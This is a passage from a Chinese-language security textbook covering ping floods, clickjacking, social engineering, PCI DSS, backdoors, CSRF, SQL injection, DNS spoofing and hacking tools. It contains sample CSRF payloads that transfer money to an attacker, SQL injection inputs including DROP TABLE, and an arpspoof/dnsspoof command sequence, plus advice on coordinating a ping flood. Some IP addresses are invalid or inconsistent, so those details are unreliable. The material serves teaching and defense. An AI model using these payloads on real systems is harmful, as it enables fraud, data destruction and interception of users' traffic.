  \ 来实施。结果是，合法或普通用户将无法访问该网站，因为每个主机（受害网络或网站）都有最大容量限制。洪水 Ping 超过了该限制并阻塞了网络。主机将随之停止响应。\n\
  \n洪水 Ping 通过创建自动化脚本或使用洪水 Ping 软件来实施。有时洪水 Ping 被称为“死亡之 Ping”，因为实施时会导致主机表现得像一台宕机的主机。\n\
  \n> **注意：** 只有当攻击者的带宽大于主机时，这才能成功。然而，成群结队地实施攻击可以达到目的。\n\n通常，并非许多网站所有者拥有无限带宽计划，因为它们太昂贵。他们转而选择其他计划（如\
  \ 10GB 带宽）。如果您尝试从 2 或 4 Mbps 的连接进行洪水 Ping，将不会成功。如果您组织一组人，比如说 20 个人，您可能会成功。从 20 台计算机同时发起攻击，每台具有\
  \ 2 Mbps 的连接，将使您的主机承受 40 Mbps 的冲击。当主机带宽为 10GB 时这可能吗？黑客通常从一台电脑创建许多连接，这足以拖慢网站的数据库和功能。\n\
  \n### 第 12 章：点击劫持\n\n点击劫持是一种网络攻击，受害者被诱骗点击一个不可见的网页元素，或一个伪装成另一个元素的元素。受害者随后可能在不知情的情况下下载恶意软件、泄露敏感信息/凭证、访问恶意页面、在线购买产品或转账。\n\
  \n通常，在点击劫持攻击中，一个不可见的 HTML 元素或页面会通过 `iframe` 显示在用户当前网页的顶层。用户点击它，以为它是可见的页面，而实际上它是一个不可见的元素。这个不可见的页面可能是受害者无意访问的页面，也可能是一个恶意页面。\n\
  \n点击劫持攻击有多种形式，例如：\n\n*   **Likejacking（赞劫持）：** 一种操纵 Facebook“赞”按钮的技巧，导致人们赞了他们本不想赞的页面。\n\
  *   **Cursor jacking（光标劫持）：** 一种改变光标位置的技术。这种攻击过去依赖 Firefox 和 Flash 中的漏洞——这些漏洞现已修复。\n\
  \n## 点击劫持攻击示例\n\n\n\n### 第 13 章：社会工程学\n\n社会工程学是指通过人际互动实施的恶意攻击。这些攻击在心理上操纵受害者，导致其泄露敏感信息或犯下安全错误。社会工程学攻击可能分多个步骤进行，也可能仅需一步。攻击者会调查目标受害者以获取背景信息。接下来，他/她会试图赢得受害者的信任，并诱导其采取后续行动从而泄露敏感信息。社会工程学攻击之所以危险，是因为它们不依赖操作系统或软件的弱点，而是依赖人为错误。\n\
  \n社会工程学攻击类型繁多，只要有人际互动的地方就可能发生。然而，某些形式更为常见，以下是五种广为人知的类型：\n\n## 诱饵攻击\n诱饵攻击利用受害者的好奇心或贪婪。攻击者将受害者引入陷阱，从而获得安装恶意软件或窃取敏感信息的能力。物理媒介广泛用于此类社会工程学攻击。恶意黑客可能会将一个感染了恶意软件的\
  \ U 盘作为诱饵，遗留在停车场、洗手间、电梯等显眼区域。一旦受害者将该驱动器插入家用或工作电脑，系统就会被感染。\n\n## 怖吓软件\n怖吓软件也称为欺诈软件、流氓扫描软件和欺骗软件。它向受害者抛出虚构的威胁和虚假警报。攻击者让用户误以为其系统感染了恶意软件。随后，他提示受害者安装一款（虚假的）反恶意软件。这款软件通常就是恶意软件本身。怖吓软件攻击通常以浏览器中外观逼真的弹窗形式呈现，告知你系统中可能存在病毒。它们也可能通过垃圾邮件传播。\n\
  \n## 借口攻击\n借口攻击是指攻击者通过撒谎来套取信息。他冒充税务官员、银行、同事或警察，向受害者索要敏感信息。在大多数情况下，他会通过提问提示你确认身份。利用这种手段可以窃取大量个人信息，如通话记录、电话号码和社会安全号码。\n\
  \n## 网络钓鱼\n网络钓鱼是一种非常流行的社会工程学攻击。网络钓鱼骗局是一种短信或电子邮件活动，旨在制造恐惧、好奇或紧迫感。受害者随后被诱骗点击恶意链接、打开携带恶意软件的附件，或泄露敏感信息。\n\
  \n## 定向钓鱼\n定向钓鱼是一种网络钓鱼骗局，但通常具有针对性。攻击者会选择特定的企业或个人。然后，他根据受害者的联系人、职位或特征精心制作特定信息。他冒充受害者，诱骗其同事或联系人泄露敏感信息。\n\
  \n## 点击劫持\n攻击者构建一个诱人的页面，承诺给用户一次免费的夏威夷之旅。攻击者在后台检查受害者是否已登录其银行网站。如果已登录，攻击者会加载允许资金转账的页面，并利用查询参数将自己的银行凭据填入表单。资金转账页面被放置在礼物页面顶部一个不可见的\
  \ `<iframe>` 中。“确认转账”按钮精准地覆盖在“领取礼物”按钮上方。受害者访问该页面，天真地点击“预订我的免费行程”按钮。用户不知情的是，他们实际上点击了一个隐藏框架，也就是点击了“确认转账”，从而不知不觉地将钱款转给了攻击者。受害者随即被重定向到一个包含礼物详情的网页。他们仍然毫不知情刚刚发生了什么。\n\
  \n防范点击劫持攻击主要有两种方法：\n\n### 客户端方法\n**破框技术** 是此处最常用的方法。客户端方法有时有效，但容易被绕过，因此并非最佳方案。\n\
  \n### 服务端方法\n**X-Frame-Options** 是最常用的方法。安全专家推荐使用这些方法。\n\n### 使用 X-Frame-Options\
  \ 响应头减少点击劫持\n此方法指示浏览器是否有权在 `<iframe>` 或 `<frame>` 标签内显示页面。`X-Frame-Options` 头允许三个值：\n\
  \n*   **DENY**：任何域名都不能在框架内显示该页面。\n*   **SAMEORIGIN**：仅当其他页面位于当前域名下时，该页面才能在其框架内显示。\n\
  *   **ALLOW-FROM URI**：仅允许在特定 URI 中以框架形式显示当前页面。\n\n### X-Frame-Options 的局限性\n* \
  \  `SAMEORIGIN` 选项不允许跨站点应用。\n*   无法创建允许域名的白名单。\n*   无法在单个页面上使用多个选项。\n*   并非所有浏览器都支持\
  \ `ALLOW-FROM` 选项。\n*   大多数浏览器已弃用 `X-Frame-Options`。\n\n## 社会工程学防范\n*   安装反恶意软件或杀毒软件并保持更新。\n\
  *   不要接受诱人的提议。\n*   考虑使用多因素认证。\n*   不要打开可疑的电子邮件或附件。\n\n---\n\n### 第 14 章：PCI DSS\n\
  \n**PCI DSS**（支付卡行业数据安全标准）是由美国运通、JCB 国际、发现金融服务、万事达卡和维萨卡于 2004 年制定的一系列安全标准。合规计划由\
  \ **PCI SSC**（安全标准委员会）管理，其目标是保护借记卡和信用卡交易免受欺诈和数据窃取。PCI SSC 无法在法律上强制合规，但所有处理借记卡或信用卡交易的企业都必须获得\
  \ PCI 认证。PCI 认证通过 PCI SSC 制定的要求来保护您企业的持卡数据。其中一些要求是众所周知的最佳实践，例如：\n\n*   使用防病毒软件\n\
  *   加密数据传输\n*   安装防火墙\n\n\n\n此外，企业必须限制对持卡人数据的访问，并监控对所有网络资源的访问。当您的企业符合 PCI 标准时，客户可以确信其信息是安全的。此外，不合规带来的声誉和经济损失足以让任何企业重视数据安全。根据每年的借记卡或信用卡交易数量，PCI\
  \ 合规分为四个级别。此分类决定了企业所需满足的要求。\n\n**1 级**：适用于每年处理超过 600 万笔卡交易的商户。必须进行年度内部审计，且须由 PCI\
  \ 审计师执行。他们还必须每季度接受一次 ASV（认证扫描供应商）的 PCI 扫描。\n\n**2 级**：适用于每年处理 100 万至 600 万笔卡交易的企业。他们每年需要使用自评问卷\
  \ (SAQ) 进行一次评估。每季度进行一次 PCI 扫描也可能是必要的。\n\n**3 级**：适用于每年处理 20,000 至 100 万笔交易的企业。必须使用适当的\
  \ SAQ 进行年度评估。他们可能需要接受每季度一次的 PCI 扫描。\n\n**4 级**：适用于每年处理不超过 20,000 笔卡交易的企业。需要进行年度\
  \ SAQ 评估。他们也可能需要接受每季度一次的 PCI 扫描。\n\nPCI SSC 制定了 12 项要求，在处理持卡人数据时必须遵守。这些要求分布在六大目标中。企业必须满足这些要求才能实现合规。\n\
  \n## 安全网络\n\n*   必须建立并维护防火墙配置。\n*   系统密码不应使用供应商提供的默认密码，而应设置为原创密码。\n\n## 安全持卡人数据\n\
  \n*   保护存储的持卡人数据。\n*   在所有公共网络上加密持卡人信息的传输。\n\n## 漏洞管理\n\n*   使用防病毒软件并定期更新。\n*  \
  \ 开发并维护安全的应用程序和系统。\n\n## 访问控制\n\n*   必须限制对持卡人数据的访问。\n*   拥有计算机访问权限的员工应被分配唯一 ID。\n\
  *   限制对持卡人数据的物理访问。\n\n## 网络监控与测试\n\n*   监控对网络资源和持卡人数据的访问。\n*   定期测试安全流程和系统。\n\n\
  ## 信息安全\n\n*   维护一项涉及信息安全的政策。\n\n### 第 15 章\n\n### 后门攻击\n\n后门攻击是一种恶意软件，它绕过正常的身份验证流程以访问网络。因此，攻击者获得了对应用程序中资源的远程访问权限。一旦实现这一点，实施者就可以远程发布系统命令，甚至更新恶意软件。攻击者通过利用\
  \ Web 应用程序中任何易受攻击的区域来实现后门安装。安装后，由于文件在大多数情况下高度隐藏，因此很难被检测到。Web 服务器后门可用于各种恶意活动，例如：\n\
  \n*   服务器劫持\n*   高级持续性威胁 (APT) 攻击\n*   感染网站访问者\n*   发起 DDoS 攻击\n*   数据窃取\n*   网页篡改\n\
  \n后门通常通过远程文件包含 (RFI) 来安装。这是一种攻击载体，它利用动态引用外部脚本的应用程序中的弱点。在 RFI 情况下，引用函数会从远程主机下载一个后门木马。\n\
  \n黑客通常使用扫描器寻找目标；他们识别出具有过时或未修补组件且允许文件注入的网站。扫描器一旦成功，就会利用该漏洞将后门安装到底层服务器中。安装后，攻击者可以随时访问它，即使漏洞修补很久之后也是如此。在大多数情况下，后门木马注入分两步进行，以绕过限制上传超过特定大小文件的安全规定。第一步，安装一个投放器——这是一个仅用于获取较大文件的小文件。然后启动第二步，涉及将后门脚本下载并安装到服务器中。\n\
  \n## 后门 Shell 移除：挑战\n\n后门不易根除。通常，检测是通过软件扫描器识别系统中已知的恶意软件签名来执行的。这种方法容易出错。后门 Shell\
  \ 通过代码混淆和别名来隐藏。在其他情况下，会使用多层加密。检测绝非易事，因为许多应用程序是基于外部框架（使用第三方插件）创建的。有时这些插件内置了后门或漏洞。依赖基于签名和启发式规则的扫描器无法有效识别此类框架中隐藏的代码。\n\
  \n即使扫描器检测到了后门，使用典型的缓解策略也很难将其从应用程序中清除。如果后门在可重写内存中反复出现，情况尤其如此。\n\n## 利用 Imperva 减少后门\
  \ Shell 攻击\n\nImperva 结合了经过验证的多种方法来阻止后门安装，以及检测和隔离任何现有的后门 Shell。Imperva WAF (Web\
  \ 应用程序防火墙) 结合用户定义和默认安全规则，阻止 RFI 攻击感染您的应用程序。该 WAF 部署在您网络的边缘，在恶意请求与您的应用程序交互之前将其拦截。如果您已经拥有一台被攻陷的\
  \ Web 服务器，Imperva 拥有后门防护解决方案，可从您的系统中检测并清除 Shell。\n\n### 第 16 章\n\n### ISO/IEC 27001\n\
  \n它也被称为 ISO 27001，是一项安全标准，规定了创建、跟踪和改进 ISMS（信息安全管理体系）的建议要求。ISMS 是一套管理和保护企业敏感信息的策略集合。服务提供商自愿采用\
  \ ISO 27001 以确保客户信息安全。必须由经认可的独立机构正式审核组织以确认合规性。与通过 ISO 27001 认证的服务提供商合作有诸多益处：\n\n\
  *   **风险管理**：ISMS 规定谁可以访问特定信息。降低了该信息被泄露的风险。\n*   **信息安全**：ISMS 拥有信息管理协议，规定如何处理特定数据。\n\
  *   **业务连续性**：服务提供商的 ISMS 必须持续接受测试和改进，以保持 ISO 27001 合规性。这可以防止数据泄露。\n\nISO 27001\
  \ 合规性对于建立信息安全治理政策至关重要。构建符合 ISO 标准的 ISMS 过程全面且包含支持、培训、规划和范围界定。在企业获得认证之前，必须解决几个重要要素。\n\
  \n## 组织环境\n\n\n\n任何可能阻碍企业建立 ISMS（信息安全管理体系）的问题，无论是外部还是内部，例如信息安全、合同、法律和法规义务，都应被识别出来。上一步骤中获得的信息用于概述\
  \ ISMS 的范围，记录所有相关领域。在此之后，ISMS 将根据 `ISO 27001` 的要求被应用、维护并持续改进。范围展示了将 ISMS 融入管理流程和结构的重要性。成千上万的组织必须遵守这些要求。为了维护\
  \ ISMS，组织的管理层需要具备相关的领导技能。这些技能包括 ISMS 的持续改进、将 ISMS 融入组织的流程、根据业务方向制定信息安全策略等。ISMS 流程应包含应对信息安全风险的计划。这包括：\n\
  \n*   创建并实施详细的风险管理流程。\n*   概述并实施降低威胁的流程。\n\n组织需要获取资源、基础设施和人员，以有效实施 ISMS。支持通常涉及指导和培训员工如何处理敏感信息。员工还应被告知如何为使\
  \ ISMS 更有效做出贡献，以及如果不遵守信息安全策略会发生什么后果。\n\n运营关乎执行上述步骤中定义的流程和计划。企业应记录所采取的行动，以确保流程按计划执行。绩效评估确保\
  \ ISMS 持续改进并继续有效运行。它还会寻找任何需要改进的领域。任何不符合项一经发现应立即处理。企业还应采取必要措施，确保问题不再复发。\n\n### 第\
  \ 17 章：恶意软件类型\n\n恶意软件是由攻击者分发的恶意软件，旨在感染组织的网络或个人计算机。它利用目标系统中的漏洞，例如缺陷。恶意软件有多种类型，每种都有其关注领域和应用场景。最常见的七种包括以下内容。\n\
  \n当勒索软件被安装到计算机系统和/或整个网络中时，它会加密文件。攻击者通过弹出窗口告知用户，只有支付赎金才会解密文件。勒索软件通过可疑的下载或电子邮件附件进入计算机。\n\
  \n最初，蠕虫被设计用于感染系统、自我复制，然后通过另一种媒介感染其他计算机。黑客利用来自许多连接设备的蠕虫创建僵尸网络。蠕虫的示例包括：\n\n*   **NgrBot**：它通过社交网站和聊天工具传播。\n\
  *   **ILOVEYOU**：这种蠕虫利用虚假的恋爱诱饵引诱人们。用户可能会被鼓励打开一封携带蠕虫的电子邮件。\n\n特洛伊木马是一种伪装成合法软件的恶意软件。与蠕虫不同，它不会自我复制。然而，它包含其他类型的恶意软件，如间谍软件、勒索软件、Rootkit\
  \ 和后门。特洛伊木马攻击倾向于针对银行业。通常，恶意软件通过软件漏洞安装在目标计算机上。当用户访问该网站时，一个伪造的屏幕会覆盖在原页面上，请求信用卡详细信息等个人数据。\n\
  \nRootkit 是预先准备好且可定制的。它们提供对应用程序敏感区域的访问权限，更改系统配置，并启用文件执行。它们通常通过社会工程学攻击部署（这可能导致登录凭证被盗），一旦安装，黑客就能访问网络。这种恶意软件会颠覆所有反恶意软件软件——攻击者随后可以为所欲为。Flame\
  \ 是一个 Rootkit 的绝佳例子。它被用于监控网络流量、记录按键和窃取屏幕截图。\n\n后门绕过访问网络所用的正常身份验证流程。它总是作为有针对性的攻击的一部分被安装。攻击者研究受害者，通过社会工程学攻击窃取其登录凭证，从而获得对网络、系统或应用程序的访问权限。后门通常试图避免被检测到，攻击者利用它们建立命令控制中心。攻击者随后可以发起系统命令并远程更新恶意软件。黑客利用后门进行各种恶意活动，包括感染访问者的计算机、拒绝服务攻击和数据窃取。当攻击者想要执行\
  \ APT（高级持续性威胁）时，这也是他们采取的第一步。\n\n广告软件是最古老的恶意软件类型之一。它是一种免费软件，会不断弹出大量广告。它不一定是恶意软件，但非常烦人——它至今仍然存在。\n\
  \n间谍软件在未经你同意的情况下收集你的个人数据并将其出售给第三方（攻击者）。\n\n### 第 18 章：物联网安全\n\n物联网是一个连接设备的网络。每个设备都有一个唯一标识符，可通过网络自动交换和收集数据。许多行业和领域使用物联网设备，例如：\n\
  \n*   **消费者应用**：一些物联网消费产品包括智能家居、智能手表和智能手机。\n*   **商业应用**：这些包括传感器、智能追踪器和智能安防摄像头。\n\
  *   **政府应用**：这些包括追踪野生动物的设备、发布自然灾害预警的设备和监控交通拥堵的设备。\n\n物联网设备的广泛使用为安全问题打开了大门，此处将详细讨论这些问题。物联网设备既受外部管理（与其他设备的交互），也受内部管理（软件维护）。每个设备都连接到一个命令与控制中心（C&C），这是管理单元。这些中心负责固件更新、配置和软件维护。它们还负责任务认证。物联网设备之间的通信通过\
  \ API（应用程序编程接口）进行。当设备的 API 被暴露时，其他应用程序或设备可以通过它收集数据并进行通信。\n\n## 物联网安全问题与漏洞\n\n\n\n\
  API 和 C&C 中心能有效管理日常的 IoT 运营。由于它们本质上是中心化的，因此存在多个可被利用的弱点，例如：\n\n- 未修补的漏洞：在大多数情况下，设备运行的是过时软件，因为最终用户需要手动下载更新，且存在连接问题。这使得它们容易受到新发现的威胁攻击。\n\
  - 弱认证：IoT 设备（如家用路由器）通常拥有易于破解的密码。这使它们成为黑客自动化脚本的易攻击目标。\n- 易受攻击的 API：针对 API 的主要威胁包括分布式拒绝服务\
  \ (DDoS)、代码注入和中间人攻击 (MITM)。\n\n这些危险可分为两类：对用户的威胁和对他人的威胁。\n\n- 数据窃取：IoT 设备拥有大量数据，在大多数情况下，这些数据是用户独有的。数据可能包括信用卡详情、个人健康信息等。\n\
  - 人身伤害：IoT 设备在医疗领域越来越普遍。其中包括除颤器和起搏器。当这些设备受到干扰时，患者的医疗护理可能会受到负面影响。\n\n易受攻击的 IoT 设备可能被渗透并用于僵尸网络。对于肇事者来说，发现无防护的设备并不困难。针对\
  \ IoT 设备的威胁变得更加复杂，这导致了大量网络攻击。有数十亿台 IoT 设备，因此其安全性应被高度重视。设备用户应遵循安全实践，例如阻止远程访问（如果不必要）和更改默认密码。\n\
  \n设备制造商和供应商应更加警惕并投资于 IoT 管理工具。他们应采取以下措施：\n\n- 通知用户有关过时软件的信息。\n- 强调智能密码管理。\n- 禁用不必要的远程访问。\n\
  - 确保 API 具有严格的访问控制策略。\n- 加强 C&C 中心的安全性。\n\n---\n\n### 第 19 章：域名服务器 (DNS) 劫持\n\n\
  DNS 劫持（或 DNS 重定向）是一种 DNS 攻击，其中 DNS 查询被错误解析，导致用户意外被重定向到恶意网站。为了实施攻击，攻击者可以在受害者的电脑上安装恶意软件、入侵/拦截\
  \ DNS 通信，或接管路由器。攻击者利用 DNS 劫持进行网络钓鱼或域名欺骗。许多 ISP（互联网服务提供商）也利用 DNS 劫持接管用户的 DNS 请求并收集统计数据。政府也利用\
  \ DNS 劫持进行审查——用户被重定向到政府授权的网站。\n\nDNS 重定向主要有四种形式：\n\n- **本地 DNS 劫持**：肇事者在受害者的计算机上安装特洛伊木马恶意软件。然后篡改本地\
  \ DNS 设置，使受害者被重定向到恶意网站。\n- **路由器 DNS 劫持**：大多数路由器存在固件漏洞或默认密码。当攻击者接管路由器时，他可以覆盖 DNS\
  \ 设置，从而影响所有连接到该路由器的用户。\n- **中间人 DNS 攻击**：肇事者拦截 DNS 服务器与用户之间的通信，然后提供另一个指向恶意网站的目标\
  \ IP 地址。\n- **流氓 DNS 服务器**：肇事者入侵 DNS 服务器并篡改 DNS 记录。结果，DNS 请求被重定向到恶意网站。\n\n当攻击者将流量从合法网站重定向到恶意网站时，就会发生\
  \ DNS 欺骗攻击。DNS 欺骗可通过 DNS 重定向实施。例如，通过攻陷 DNS 服务器，攻击者可以欺骗合法网站，然后将用户重定向到其他恶意网站。缓存投毒也可用于执行\
  \ DNS 欺骗，而无需依赖 DNS 劫持。攻击者可以放入一个非法的 DNS 条目并投毒 DNS 缓存。该条目包含一个替代目标 IP。在缓存刷新之前，该域名将被解析到被欺骗的网站。\n\
  \n由于 DNS 名称服务器是非常敏感的基础设施，因此需要强有力的安全措施。黑客可能劫持它并用于执行 DDoS 攻击。\n\n- 网络上的解析器：关闭任何不需要的\
  \ DNS 解析器。至于合法的解析器，确保它们位于防火墙后面，且无法从外部访问。\n- 限制对名称服务器的访问：使用网络安全措施、防火墙、物理安全和多因素访问控制。\n\
  - 警惕缓存投毒：域名中的大小写和查询 ID 应随机化，并尝试使用随机源端口。\n- 处理已知漏洞：攻击者总是在寻找易受攻击的 DNS 服务器。\n- 解析器应与权威名称服务器分离：两者不应运行在同一台服务器上。\n\
  - 确保区域传输受到限制。\n\n对于最终用户，安装杀毒软件、更改路由器密码和使用加密 VPN 通道等操作可保护他们免受 DNS 劫持。\n\n## 网站所有者的缓解措施\n\
  \n应采取的步骤：\n\n- DNSSEC\n- 客户端锁定\n- 安全访问\n\n---\n\n### 第 20 章：跨站请求伪造 (CSRF) 攻击\n\n\
  CSRF（也称为会话劫持、Sea Surf 或 XSRF）是一种操纵 Web 浏览器在用户已登录的应用程序中执行非预期操作的攻击。当 CSRF 攻击成功时，用户和企业都会受到影响。它可能导致未经授权的资金转移、数据窃取（包括会话\
  \ Cookie）、密码篡改或客户关系受损。CSRF 通常通过社会工程学攻击执行，例如诱导用户向服务器发送伪造请求的链接或电子邮件。应用程序在攻击期间对毫无戒心的用户进行身份验证——这使得很难区分伪造请求和合法请求。\n\
  \n## CSRF 攻击示例\n\n攻击者花费一些时间研究应用程序，以便使请求看起来完全像合法请求。以 `GET` 请求为例，假设进行 200 美元的银行转账。它通常如下所示：\n\
  \n```\nGET http://netbank.com/transfer.do?acct=PersonB&amount=$200 HTTP/1.1\n```\n\
  \n攻击者可能会篡改此脚本，将 200 美元转入自己的账户。恶意请求可能如下所示：\n\n```\nGET http://netbank.com/transfer.do?acct=AttackerA&amount=$200\
  \ HTTP/1.1\n```\n\n然后攻击者可将此请求嵌入到一个看似无害的链接中：\n\n```html\n<a href=\"http://netbank.com/transfer.do?acct=AttackerA&amount=$200\"\
  >Read more!</a>\n```\n\n攻击者的下一步是通过电子邮件将此链接发送给尽可能多的银行客户。任何在登录银行账户时点击该链接的人，都可能无意中向黑客转账\
  \ 200 美元。如果银行仅使用 `POST` 请求，则使用 `<a>` href 标签执行的恶意请求无法成功。尽管如此，攻击者仍可结合自动执行的嵌入式 JavaScript\
  \ 使用 `<form>` 标签。\n\n例如：\n\n```html\n<body onload=\"document.forms[0].submit()\"\
  >\n<form action=\"http://netbank.com/transfer.do\" method=\"POST\">\n<input type=\"\
  hidden\" name=\"acct\" value=\"AttackerA\"/>\n<input type=\"hidden\" name=\"amount\"\
  \ value=\"$100\"/>\n<input type=\"submit\" value=\"View my pictures!\"/>\n</form>\n\
  </body>\n```\n\n\n\n\n# CSRF 攻击预防与缓解\n\n有多种方法可以预防和缓解 CSRF 攻击。对于用户而言，可以通过拒绝未经授权的行为者访问应用程序以及保护其登录凭据来预防\
  \ CSRF 攻击。\n\n以下是一些很好的实践：\n\n- 使用安全的密码和用户名\n- 不使用 Web 应用程序时及时注销\n- 防止浏览器记住密码\n-\
  \ 登录应用程序时避免同时浏览其他网站\n\nWeb 应用程序也可以利用可用的解决方案来阻止恶意流量并制止攻击。一种常见的缓解方法是为每个 ID 或会话请求创建随机令牌。服务器随后会检查并验证这些令牌。任何缺少值或包含重复令牌的会话请求都会被阻止。如果请求与其会话\
  \ ID 的令牌不匹配，也会被阻止访问应用程序。CSRF 攻击也可以通过双重提交 Cookie 的方法来阻止。就像上述方法一样，请求参数和 Cookie 都被分配了随机令牌。在授予应用程序访问权限之前，服务器必须确保令牌匹配。令牌并非\
  \ 100% 有效。\n\n### 第 21 章：结构化查询语言 (SQL) 注入\n\n**SQL 注入** 或 **SQLI** 是指使用恶意 SQL 代码操纵后端数据库，以访问敏感信息（私人客户详情、用户列表等）。SQL\
  \ 注入对企业的影响可能非常大。如果此类攻击成功，未经授权的人员可能查看用户列表，整个表可能被删除，在极端情况下，攻击者可能获得数据库的管理员权限。在谈论组织因\
  \ SQLI 而遭受的损失时，必须提及如果个人信息（信用卡详情、地址和电话号码）被盗，将导致与客户的关系受损。任何 SQL 数据库都可能遭受此攻击，但网站是最常见的目标。SQL\
  \ 是用于访问和操作数据库的标准化语言，旨在为每个用户创建可定制的视图。SQL 查询有助于执行记录删除、数据检索和更新等命令。有不同的 SQL 元素用于执行这些任务。以下是电子商店典型的\
  \ SQL 数据库查询：\n\n```\nSELECT ItemName, ItemDescription\nFROM Item\nWHERE ItemNumber\
  \ = ItemNumber\n```\n\n根据此查询，Web 应用程序创建一个字符串查询，并将其作为一条 SQL 语句发送到数据库：\n\n```\nsql_query\
  \ = \"\nSELECT ItemName, ItemDescription\nFROM Item\nWHERE ItemNumber = \" & Request.QueryString(\"\
  ItemID\")\n```\n\n用户提供的输入 `http://www.estore.com/items/items.asp?itemid=999` 随后生成此查询：\n\
  \n```\nSELECT ItemName, ItemDescription\nFROM Item\nWHERE ItemNumber = 999\n```\n\
  \n从语法可以看出，此查询返回物品编号 999 的描述。\n\n## SQL 注入示例\n\n当攻击者想要实施 SQLI 时，他们会使用典型的 SQL 查询来利用数据库中未经验证的输入漏洞。攻击者可以通过多种方式执行此攻击向量，此处列举部分示例。上述输入例如提取特定产品的信息。它可以被更改为\
  \ `http://www.estore.com/items/items.asp?itemid=999 or 1=1`\n\n相应的 SQL 查询将变为：\n\n\
  ```\nSELECT ItemName, ItemDescription\nFROM Items\nWHERE ItemNumber = 999 OR 1=1\n\
  ```\n\n`1=1` 是一个永远为真的语句，因此该查询将返回数据库中每一个物品的名称和描述，包括那些你无权访问的。\n\n攻击者还可以利用过滤不当的字符来更改\
  \ SQL 命令——这包括用于分隔字段的分号。例如，此输入 `http://www.estore.com/items/iteams.asp?itemid=999;\
  \ DROP TABLE Users` 将生成如下 SQL 查询：\n\n```\nSELECT ItemName, ItemDescription\nFROM\
  \ Items\nWHERE ItemNumber = 999; DROP TABLE USERS\n```\n\n这可能导致用户数据库被删除。\n\n## SQLI\
  \ 缓解与预防\n\n你可以通过多种方式防止 SQLI 攻击的发生，并在攻击发生时进行防护。\n\n一些最佳方法包括：\n\n- **输入清理/验证** ——\
  \ 编写能够识别非法用户输入的代码。这是一个好习惯，但仍不是 100% 有效。\n- **WAF (Web 应用程序防火墙)** —— 它能在其他网络威胁中过滤掉\
  \ SQLI。\n\n### 第 22 章：DNS 欺骗\n\n**DNS (域名服务器) 欺骗** 也称为 **DNS 缓存投毒**。这是一种利用篡改的 DNS\
  \ 记录将流量重定向到恶意网站而非预期网站的攻击。这个欺诈网站看起来与合法网站非常相似。一旦受害者进入攻击者的网站，就会被提示登录看起来像是他们自己的账户。在此过程中，恶意行为者窃取用户的敏感信息和登录凭据。此外，攻击者还可以在用户计算机上安装病毒或蠕虫，从而长期访问其他类型的数据。\n\
  \nDNS 欺骗攻击可以通过特定方法执行，包括：\n\n- **中间人攻击 (MITM)**：攻击者拦截 DNS 服务器与用户之间的通信，并将受害者路由到欺诈性\
  \ IP 地址。\n- **DNS 服务器入侵**：攻击者直接劫持 DNS 服务器并将其配置为返回欺诈性 IP 地址。\n\n在本例中，攻击者（IP 为 `192.168.6.300`）拦截了\
  \ `www.estores.com` 的服务器计算机（IP 为 `192.168.4.200`）与其客户端（IP 为 `192.168.1.100`）之间的通信通道。在这种情况下，客户端被\
  \ `arpspoof` 等工具欺骗，误以为攻击者的 IP 地址是服务器的。同样，服务器也被欺骗，误以为攻击者的 IP 地址是客户端的。\n\n过程如下：\n\n\
  1. 攻击者使用 `arpspoof` 发出此命令：`arpspoof 192.168.1.100 192.168.2.200`。服务器 ARP 表中的 MAC\
  \ IP 地址被修改，使其认为攻击者的 PC 是客户端。\n2. 攻击者再次使用 `arpspoof` 发出此命令：`arpspoof 192.168.2.200\
  \ 192.168.1.100`。这使客户端认为攻击者的 PC 属于服务器。\n3. 攻击者的下一步是发出 Linux 命令：`echo 1 > /proc/sys/net/ipv4/ip_forward`，以便在服务器和客户端之间交换的数据包被转发到攻击者的计算机。\n\
  4. 攻击者在其本地计算机上创建主机文件 `estores.com 192.168.3.300`。它将合法网站映射到其本地 IP。\n5. 攻击者在本地计算机的\
  \ IP 地址上创建 Web 服务器，并建立一个外观类似合法网站的恶意网站。\n6. 最后，攻击者使用 `dnsspoof` 等工具，将所有 DNS 请求定向到其本地主机文件。当用户尝试访问真实网站时，会弹出虚假网站，当他们与之交互时，其计算机会感染恶意软件。\n\
  \n## 使用 DNSSEC (域名系统安全扩展) 缓解 DNS 欺骗\n\nDNS 是一种未加密的协议，DNS 服务器在重定向流量时从不验证 IP 地址。DNSSEC\
  \ 增加了额外的验证方法。它设置一个专属于你的加密签名来验证 DNS 响应。它非常有效，但也有几个缺点，包括：\n\n\n\n\n### 第 23 章\n\n\
  ### 道德黑客工具\n\n自动化工具的兴起给渗透测试或道德黑客领域带来了巨大变革。目前仍有工具正在开发中，以帮助加快测试进程。道德黑客为组织保护其系统和信息提供了一种途径。这是组织提升安全专业技能的最佳方式之一。当道德黑客成为安全措施的一部分时，公司将获益匪浅。\n\
  \n道德黑客中常用的工具包括：\n\n**Nmap（网络映射器）** —— 有史以来最优秀的黑客工具之一。它用于道德黑客的一个阶段，称为端口扫描。它最初是一个命令行工具，但最终被修改以适用于基于\
  \ Unix 或 Linux 的操作系统。目前，Nmap 已有 Windows 版本。Nmap 是一款网络安全映射工具。它可以发现网络上的主机和服务，从而绘制网络拓扑图。该软件提供多种功能，用于探测计算机网络、检测操作系统以及主机发现。它支持脚本扩展，因此能够提供高级漏洞检测，并在扫描过程中适应延迟、拥塞及其他网络状况。\n\
  \n**Nessus** 是全球最流行的漏洞扫描器。它由 Tenable Network Security 开发。专家推荐将其用于非企业用途——它也是免费的。这款扫描器效率极高，能发现任何网络上的漏洞。以下是\
  \ Nessus 可检测的漏洞类型：\n\n- 不同的系统漏洞\n- 弱密码——常见密码和默认密码\n- 配置错误和未修补的服务\n\n**Nikto** Web\
  \ 扫描器可扫描并测试大量 Web 服务器，识别危险文件或 CGI、过时软件及其他相关问题。它通过捕获接收到的 Cookie，可执行通用和特定服务器的打印与检查。该工具免费且开源。它针对\
  \ 270 种服务器检查特定版本问题，并查找默认文件和程序。以下是 Nikto 的主要功能：\n\n- 开源工具\n- 检查配置错误的文件和插件\n- 识别不安全的文件和程序\n\
  - 扫描服务器以查找过时版本和其他特定版本问题\n- 扫描 Web 服务器以查找潜在危险文件或 6400 多个 CGI\n\n**Kismet** 最适合用于寻找无线网络、入侵无线局域网以及测试无线网络。它通过数据流量识别网络、收集数据包，并识别隐藏和非信标网络。基本上，Kismet\
  \ 是一款无线网络探测器和嗅探器。它支持原始监控模式，并配合其他无线网卡工作。以下是 Kismet 的一些基本特征：\n\n- 有时适用于 Windows\n\
  - 运行于 Linux 操作系统\n\n**NetStumbler** 可防止寻找无线网络攻击。它运行在 Windows 操作系统上。它能检测三种类型的网络。它还有一个名为\
  \ MiniStumbler 的新版本。\n\n以下是 NetStumbler 的用途：\n\n- 检测未授权的接入点\n- 评估接收信号强度\n- 确定干扰原因\n\
